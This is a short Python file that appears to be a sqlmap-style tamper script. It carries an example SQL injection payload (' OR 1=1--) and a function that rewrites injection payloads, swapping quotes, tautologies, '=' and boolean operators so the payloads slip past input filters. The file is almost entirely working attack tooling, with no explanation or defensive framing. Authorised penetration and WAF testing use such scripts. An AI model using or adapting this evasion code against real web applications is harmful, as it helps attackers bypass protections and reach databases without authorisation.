import random

__example_payload__ = "' OR 1=1--"
__type__ = "converting SQL string comparisons to numeric operations to bypass filter"


def tamper(payload, **kwargs):
    replacements = {
        "'": '"',
        "1=1": "2>1",
        "1=2": "2>3",
        "=": " LIKE ",
        "OR": "||",
        "AND": "&&",
    }
    for key, val in replacements.items():
        payload = payload.replace(key, val)
    return payload
